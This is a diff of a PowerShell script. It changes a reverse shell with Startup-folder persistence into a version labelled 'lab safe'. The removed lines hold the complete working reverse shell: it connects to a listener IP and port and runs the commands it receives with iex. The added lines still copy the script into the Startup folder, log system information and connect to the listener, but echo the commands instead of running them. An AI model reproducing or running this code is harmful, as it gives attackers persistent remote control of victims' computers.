@@ -1,27 +1,41 @@
-# code.ps1 - Reverse shell + persistence
-# Replace IP and port with your listener
-$ip='192.168.1.18'
-$port=4443
+$logFile = "$env:APPDATA\SystemLog.txt"
+$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code.ps1"
 
-# --- Persistence: Save to Startup folder ---
-$startup="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code.ps1"
-if (-not (Test-Path $startup)) {
-    Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $startup -Force
+try {
+    $sysInfo = Get-ComputerInfo | Out-String
+    Add-Content -Path $logFile -Value ("`n--- Log Entry: $(Get-Date) ---`n" + $sysInfo)
+} catch {
+    Add-Content -Path $logFile -Value ("Failed to log system info: $_")
+}
+try {
+    if (-not (Test-Path $startupPath)) {
+        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $startupPath -Force
+        Add-Content -Path $logFile -Value "Copied to startup: $startupPath"
+    }
+} catch {
+    Add-Content -Path $logFile -Value ("Failed to copy to startup: $_")
 }
 
-# --- Reverse Shell ---
+$serverIP = '192.168.1.18'  # YOUR LAB listener IP
+$serverPort = 4443           # YOUR LAB listener port
+
 try {
-    $c=New-Object Net.Sockets.TCPClient($ip,$port)
-    $s=$c.GetStream()
-    [byte[]]$b=0..65535|%{0}
-    while(($i=$s.Read($b,0,$b.Length)) -ne 0){
-        $d=([Text.Encoding]::ASCII).GetString($b,0,$i)
-        $r=iex $d 2>&1 | Out-String
-        $r2=$r+'PS '+(pwd).Path+'> '
-        $s.Write(([Text.Encoding]::ASCII).GetBytes($r2),0,$r2.Length)
+    $c = New-Object Net.Sockets.TCPClient($serverIP, $serverPort)
+    $s = $c.GetStream()
+    [byte[]]$b = 0..65535 | % {0}
+
+    while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
+        $d = ([Text.Encoding]::ASCII).GetString($b, 0, $i)
+        
+        # LAB SAFE: simulate command execution
+        $r = "Executed safely in lab: $d"
+        
+        $r2 = $r + ' PS ' + (pwd).Path + '> '
+        $s.Write(([Text.Encoding]::ASCII).GetBytes($r2), 0, $r2.Length)
         $s.Flush()
     }
+
     $c.Close()
 } catch {
-    Start-Sleep -Seconds 10
+    Add-Content -Path $logFile -Value ("Connection to $serverIP:$serverPort failed: $_")
 }
